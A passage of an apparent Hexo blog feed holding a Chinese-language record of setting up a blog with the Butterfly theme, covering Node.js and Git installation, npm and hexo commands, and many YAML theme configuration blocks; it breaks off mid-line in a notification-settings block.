git表示成功了</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h2 id="四、后续BUG修复"><a href="#四、后续BUG修复" class="headerlink" title="四、后续BUG修复"></a>四、后续BUG修复</h2><h3 id="代码自动换行"><a href="#代码自动换行" class="headerlink" title="代码自动换行"></a>代码自动换行</h3><blockquote><p>在butterfly中配置了code_word_wrap: true后，代码块前面会自动多出两列行号。原因不明。</p><p>后续修复方式：卸载全部文章再重新放入网站中就正常了。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网站配置记录</title>
      <link href="/posts/dd9c034b.html"/>
      <url>/posts/dd9c034b.html</url>
      
        <content type="html"><![CDATA[<h1 id="网站配置记录"><a href="#网站配置记录" class="headerlink" title="网站配置记录"></a>网站配置记录</h1><blockquote><p>配置参考教程：<a href="https://www.fomal.cc/posts/eec9786.html">author::博客魔改教程总结(一) | Fomalhaut🥝</a></p></blockquote><hr><h2 id="〇、环境配置"><a href="#〇、环境配置" class="headerlink" title="〇、环境配置"></a>〇、环境配置</h2><h3 id="Node-js-Git"><a href="#Node-js-Git" class="headerlink" title="Node.js+Git"></a>Node.js+Git</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://nodejs.org/en/download">official::Download | Node.js (nodejs.org)</a></p><p><a href="https://blog.csdn.net/WHF__/article/details/129362462">author::Node.js下载安装及环境配置教程</a></p><p>安装过程中不选中Automatically install the necessary tools.其他默认。</p><p>测试可以在控制台输入<code>node -v</code>和<code>npm -v</code>，返回版本就是安装成功。</p><p>然后再node.js下创建两个文件并配置路径，文件名为node_global，node_cache，命令如下：</p><ul><li><p><code>npm config set prefix &quot;D:\Node.js\node_global&quot;</code></p></li><li><p><code>npm config set cache &quot;D:\Node.js\node_cache&quot;</code></p></li></ul><p>然后配置环境变量。</p><p>系统变量配置：</p><ul><li><p>新增NODE_PATH：<code>D:\nodejs\node_global\node_modules</code>（此时会在文件夹中自动生成node_modules，没有则自己手动创建）</p></li><li><p>在Path中添加：<code>%NODE_PATH%</code></p></li></ul><p>用户变量配置</p><ul><li>在Path中修改：<code>...npm</code>的路径改为<code>D:\Node.js\node_global</code></li></ul><p>之后安装时带<code>-g</code>表示会全局安装，安装到node_global中。</p><hr><p><a href="https://git-scm.com/download/win">official::Git - Downloading Package (git-scm.com)</a></p><p>全点下一步。</p>              </div>            </details><h3 id="hexo-butterfly"><a href="#hexo-butterfly" class="headerlink" title="hexo+butterfly"></a>hexo+butterfly</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p>全局安装hexo框架：<code>npm install hexo -g</code></p><p>当前目标生成demo（注意安装前记得切换目录）：<code>hexo init demoblog</code></p><p>在demoblog下用git下载butterfly：<code>git clone -b master https://gitee.com/immyw/hexo-theme-butterfly.git themes/butterfly</code></p><p>启动hexo：<code>hexo s -p 8080</code></p>              </div>            </details><hr><h2 id="一、简单文件配置"><a href="#一、简单文件配置" class="headerlink" title="一、简单文件配置"></a>一、简单文件配置</h2><h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>site</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5行</span></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Magialeaf的小窝</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">欢迎来到我的小窝！</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Maigaleaf</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br></pre></td></tr></table></figure></li><li><p>url</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 14行</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span>  <span class="string">http://Magialeaf.github.io</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure></li><li><p>解析文件名</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 35行</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 50行</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">prismjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>主题</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 106行</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="butterfly配置"><a href="#butterfly配置" class="headerlink" title="butterfly配置"></a>butterfly配置</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>目录</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约11行</span></span><br><span class="line"><span class="comment"># Menu 目錄</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-graduation-cap</span> <span class="string">||</span> <span class="attr">hide:</span></span><br><span class="line">    <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">归档:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">作品</span> <span class="string">||</span> <span class="string">fa-solid</span> <span class="string">fa-bookmark</span> <span class="string">||</span> <span class="attr">hide:</span></span><br><span class="line">    <span class="string">作品集:</span> <span class="string">/works/</span> <span class="string">||</span> <span class="string">fa-sharp</span> <span class="string">fa-solid</span> <span class="string">fa-star</span></span><br><span class="line">  <span class="string">社区</span> <span class="string">||</span> <span class="string">fa-solid</span> <span class="string">fa-comment</span> <span class="string">||</span> <span class="attr">hide:</span></span><br><span class="line">    <span class="string">留言板:</span> <span class="string">/comments/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-envelope-open</span></span><br><span class="line">  <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-heart</span>  </span><br></pre></td></tr></table></figure></li><li><p>代码样式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约39行</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">mac</span> <span class="comment">#  darker / pale night / light / ocean / mac / mac light / false</span></span><br><span class="line"><span class="attr">highlight_copy:</span> <span class="literal">true</span> <span class="comment"># copy button</span></span><br><span class="line"><span class="attr">highlight_lang:</span> <span class="literal">true</span> <span class="comment"># show the code language</span></span><br><span class="line"><span class="attr">highlight_shrink:</span> <span class="literal">false</span> <span class="comment"># true: shrink the code blocks / false: expand the code blocks | none: expand code blocks and hide the button</span></span><br><span class="line"><span class="attr">highlight_height_limit:</span> <span class="literal">false</span> <span class="comment"># unit: px</span></span><br><span class="line"><span class="attr">code_word_wrap:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>头像栏</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约46行</span></span><br><span class="line"><span class="comment"># Social Settings (社交圖標設置)</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line"><span class="comment"># Image (圖片設置)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="comment"># Favicon（網站圖標）</span></span><br><span class="line"><span class="attr">favicon:</span></span><br><span class="line"><span class="comment"># Avatar (頭像)</span></span><br><span class="line"><span class="attr">avatar:</span></span><br></pre></td></tr></table></figure></li><li><p>文章封面</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约96行</span></span><br><span class="line"><span class="attr">cover:</span></span><br><span class="line">  <span class="comment"># display the cover or not (是否顯示文章封面)</span></span><br><span class="line">  <span class="attr">index_enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">aside_enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">archives_enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># the position of cover in home page (封面顯示的位置)</span></span><br><span class="line">  <span class="comment"># left/right/both</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">both</span></span><br><span class="line">  <span class="comment"># When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span></span><br><span class="line">  <span class="attr">default_cover:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace Broken Images (替換無法顯示的圖片)</span></span><br><span class="line"><span class="attr">error_img:</span></span><br><span class="line">  <span class="attr">flink:</span> <span class="string">/img/friend_404.gif</span></span><br><span class="line">  <span class="attr">post_page:</span> <span class="string">/img/error.png</span> <span class="comment"># /img/404.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A simple 404 page</span></span><br><span class="line"><span class="attr">error_404:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">subtitle:</span> <span class="string">&#x27;页面没有找到&#x27;</span></span><br><span class="line">  <span class="attr">background:</span> <span class="string">/img/404.jpg</span></span><br></pre></td></tr></table></figure></li><li><p>文章信息</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">page:</span> <span class="comment"># Home Page</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment"># created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">date</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 主頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">false</span> <span class="comment"># true or false 主頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br><span class="line">  <span class="attr">post:</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment"># created or updated or both 文章頁日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">relative</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br></pre></td></tr></table></figure></li><li><p>copy</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约168行，开启超过字数限制会自带版权提示</span></span><br><span class="line"><span class="comment"># copy settings</span></span><br><span class="line"><span class="comment"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span></span><br><span class="line"><span class="attr">copy:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit_count:</span> <span class="number">50</span></span><br></pre></td></tr></table></figure></li><li><p>toc</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约179行</span></span><br><span class="line"><span class="comment"># toc (目錄)</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">page:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span> <span class="comment"># 关闭，不然在我的目录号前还会有目录号</span></span><br><span class="line">  <span class="attr">expand:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">style_simple:</span> <span class="literal">false</span> <span class="comment"># for post</span></span><br><span class="line">  <span class="attr">scroll_percent:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>reward</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约196行，打赏</span></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">QR_code:</span></span><br></pre></td></tr></table></figure></li><li><p>推荐文章</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约214行</span></span><br><span class="line"><span class="comment"># Related Articles</span></span><br><span class="line"><span class="attr">related_post:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">6</span> <span class="comment"># Number of posts displayed</span></span><br><span class="line">  <span class="attr">date_type:</span> <span class="string">updated</span> <span class="comment"># or created or updated 文章日期顯示創建日或者更新日</span></span><br></pre></td></tr></table></figure></li><li><p>文章过期提醒</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约227行</span></span><br><span class="line"><span class="comment"># Displays outdated notice for a post (文章過期提醒)</span></span><br><span class="line"><span class="attr">noticeOutdate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">flat</span> <span class="comment"># style: simple/flat</span></span><br><span class="line">  <span class="attr">limit_day:</span> <span class="number">365</span> <span class="comment"># When will it be shown</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span> <span class="comment"># position: top/bottom</span></span><br><span class="line">  <span class="attr">message_prev:</span> <span class="string">距离上次更新已经过去</span></span><br><span class="line">  <span class="attr">message_next:</span> <span class="string">天了，文章内容可能已经过期！</span></span><br></pre></td></tr></table></figure></li><li><p>footer</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约236行</span></span><br><span class="line"><span class="comment"># Footer Settings</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">owner:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">since:</span> <span class="number">2023</span></span><br><span class="line">  <span class="attr">custom_text:</span> <span class="string">版本V1.0</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="literal">false</span> <span class="comment"># Copyright of theme and framework</span></span><br></pre></td></tr></table></figure></li><li><p>aside</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约248行</span></span><br><span class="line"><span class="comment"># 侧边栏显示的信息</span></span><br><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">    <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">&lt;card_announce_top&gt;当前网站版本为V1.0&lt;br</span> <span class="string">/&gt;&lt;/card_announce_top&gt;</span></span><br><span class="line">      <span class="string">&lt;card_announce_content&gt;</span></span><br><span class="line">      <span class="number">1</span><span class="string">.这里大多数文章是我之前随意记的笔记，可能格式以及对网站的适配性有点不好。&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="number">2</span><span class="string">.并且文章大多数都类似于思维导图，没有太详细的内容。&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="number">3</span><span class="string">.之后会完善一些之前写的文章，以及写一些详细的文章放到网站上。&lt;br</span> <span class="string">/&gt;&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&lt;/card_announce_content&gt;</span></span><br><span class="line">      <span class="string">&lt;card_announce_tip&gt;</span></span><br><span class="line">      <span class="string">文章链接为紫色，链接前缀如下：&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">1</span><span class="string">.无前缀（百科或其他作者的链接）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">2.</span><span class="string">author::（文章中引用了许多该作者的内容）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">3.</span><span class="string">official::（官网链接）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">4.</span><span class="string">text::（我的其他文本）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">5.</span><span class="string">my::（我的库或其他链接）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&lt;/card_announce_tip&gt;</span></span><br><span class="line"><span class="comment"># 其他如card_categories,card_tags,card_archives设置为false</span></span><br></pre></td></tr></table></figure></li><li><p>简繁切换</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约336行</span></span><br><span class="line"><span class="comment"># Conversion between Traditional and Simplified Chinese (簡繁轉換)</span></span><br><span class="line"><span class="attr">translate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>阅读模式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约350行</span></span><br><span class="line"><span class="comment"># Read Mode (閲讀模式)</span></span><br><span class="line"><span class="attr">readmode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>黑夜模式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约354行</span></span><br><span class="line"><span class="comment"># dark mode</span></span><br><span class="line"><span class="attr">darkmode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">autoChangeMode:</span> <span class="number">2</span> <span class="comment">#模式2，在晚上18点到早上6点的时间自动切换成黑夜模式</span></span><br></pre></td></tr></table></figure></li><li><p>mathjax</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约385行，要安装插件，如下</span></span><br><span class="line"><span class="comment"># npm uninstall hexo-renderer-marked --save -g</span></span><br><span class="line"><span class="comment"># npm install hexo-renderer-kramed --save -g</span></span><br><span class="line"><span class="comment"># MathJax</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li><li><p>本地搜索</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约407行</span></span><br><span class="line"><span class="comment"># 可能要npm install hexo-generator-search -g</span></span><br><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">True</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br></pre></td></tr></table></figure></li><li><p>主题色</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约653行</span></span><br><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">main:</span> <span class="string">&quot;#49B1F5&quot;</span></span><br><span class="line">  <span class="attr">paginator:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">button_hover:</span> <span class="string">&quot;#FF7242&quot;</span></span><br><span class="line">  <span class="attr">text_selection:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">link_color:</span> <span class="string">&quot;#DA20D8&quot;</span>      <span class="comment"># 超链接颜色</span></span><br><span class="line">  <span class="attr">meta_color:</span> <span class="string">&quot;#858585&quot;</span></span><br><span class="line">  <span class="attr">hr_color:</span> <span class="string">&quot;#A4D8FA&quot;</span></span><br><span class="line">  <span class="attr">code_foreground:</span> <span class="string">&quot;#F47466&quot;</span></span><br><span class="line">  <span class="attr">code_background:</span> <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">  <span class="attr">toc_color:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">blockquote_padding_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">blockquote_background_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">scrollbar_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">meta_theme_color_light:</span> <span class="string">&quot;ffffff&quot;</span></span><br><span class="line">  <span class="attr">meta_theme_color_dark:</span> <span class="string">&quot;#0d0d0d&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>网站背景和页脚</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约687行</span></span><br><span class="line"><span class="comment"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span></span><br><span class="line"><span class="attr">background:</span> <span class="string">url(/img/background.jpg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer Background</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>背景彩带</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约726行</span></span><br><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&#x27;0,0,255&#x27;</span> <span class="comment">#color of lines, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(<span class="doctag">note:</span> use &#x27;,&#x27; to separate.)</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.7</span> <span class="comment"># the opacity of line (0~1), default: 0.5.</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background, default: -1.</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">40</span> <span class="comment"># the number of lines, default: 99.</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">true</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>水平分割线和字体</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约760行</span></span><br><span class="line"><span class="comment"># Beautify (美化頁面顯示)</span></span><br><span class="line"><span class="attr">beautify:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开启才有水平分割线，下面的标题前的符号可以注释掉</span></span><br><span class="line">  <span class="comment"># field: site # site/post</span></span><br><span class="line">  <span class="comment"># title-prefix-icon: &#x27;&#x27; # &#x27;\f0c1&#x27; </span></span><br><span class="line">  <span class="comment"># title-prefix-icon-color: &#x27;&#x27;  # &#x27;#F47466&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span> <span class="string">&#x27;15.5px&#x27;</span></span><br><span class="line">  <span class="attr">code-font-size:</span> <span class="string">&#x27;14.5px&#x27;</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">YSHST,</span> <span class="string">-apple-system,</span> <span class="string">&#x27;Quicksand&#x27;</span><span class="string">,</span> <span class="string">&#x27;Nimbus Roman No9 L&#x27;</span><span class="string">,</span> <span class="string">&#x27;PingFang SC&#x27;</span><span class="string">,</span> <span class="string">&#x27;Hiragino Sans GB&#x27;</span><span class="string">,</span> <span class="string">&#x27;Noto Serif SC&#x27;</span><span class="string">,</span> <span class="string">&#x27;Microsoft Yahei&#x27;</span><span class="string">,</span> <span class="string">&#x27;WenQuanYi Micro Hei&#x27;</span><span class="string">,</span> <span class="string">&#x27;ST Heiti&#x27;</span><span class="string">,</span> <span class="string">sans-serif;</span></span><br><span class="line">  <span class="attr">code-font-family:</span> <span class="string">Consolas_1,</span> <span class="string">YSHST,</span> <span class="string">&quot;Microsoft YaHei&quot;</span><span class="string">,</span> <span class="string">Menlo,</span> <span class="string">&quot;PingFang SC&quot;</span><span class="string">,</span> <span class="string">&quot;Microsoft JhengHei&quot;</span><span class="string">,</span> <span class="string">sans-serif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Font settings for the site title and site subtitle</span></span><br><span class="line"><span class="comment"># 左上角網站名字 主頁居中網站名字</span></span><br><span class="line"><span class="attr">blog_title_font:</span></span><br><span class="line">  <span class="attr">font_link:</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">YSHST</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The setting of divider icon (水平分隔線圖標設置)</span></span><br><span class="line"><span class="attr">hr_icon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">&#x27;\f2dc&#x27;</span> <span class="comment"># the unicode value of Font Awesome icon, such as &#x27;\3423&#x27;</span></span><br><span class="line">  <span class="attr">icon-top:</span> <span class="string">-10px</span></span><br></pre></td></tr></table></figure></li><li><p>主页副标题</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约787行</span></span><br><span class="line"><span class="comment"># the subtitle on homepage (主頁subtitle)</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">True</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">typed_option:</span></span><br><span class="line">  <span class="attr">source:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">欢迎来到我的小窝</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">立于浮华之世，奏响天籁之音</span></span><br></pre></td></tr></table></figure></li><li><p>字数统计</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 817行</span></span><br><span class="line"><span class="comment"># wordcount (字數統計)</span></span><br><span class="line"><span class="comment"># see https://butterfly.js.org/posts/ceeb73f/#字數統計</span></span><br><span class="line"><span class="attr">wordcount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_wordcount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_wordcount:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>弹窗关闭</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">snackbar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top-left</span></span><br><span class="line">  <span class="attr">bg_light:</span> <span class="string">&#x27;#49b1f5&#x27;</span> <span class="comment"># The background color of Toast Notification in light mode</span></span><br><span class="line">  <span class="attr">bg_dark:</span> <span class="string">&#x27;#1f1f1f&#x27;</span> <span class="comment"># The background color of Toast 